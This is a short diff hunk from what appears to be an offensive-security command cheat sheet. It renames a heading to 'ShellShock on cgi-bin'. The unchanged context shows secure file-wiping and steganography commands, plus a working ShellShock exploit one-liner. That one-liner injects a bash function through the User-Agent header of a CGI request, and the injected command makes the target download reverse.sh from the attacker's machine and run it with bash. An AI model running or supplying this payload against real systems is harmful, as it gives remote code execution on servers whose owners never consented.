@@ -261,7 +261,7 @@ scrub -p dod file.txt && shred -zun 5 -v file.txt
 stephide info <image.png>
 ```
 
-# Shellcode on cgi-bin
+# ShellShock on cgi-bin
 ```
 curl -H "User-Agent: () { :; };echo;echo; /usr/bin/curl http://<your-local-ip>/reverse.sh | /bin/bash" "http://<remote-affected-ip>/cgi-bin/test.cgi"; echo
 ```
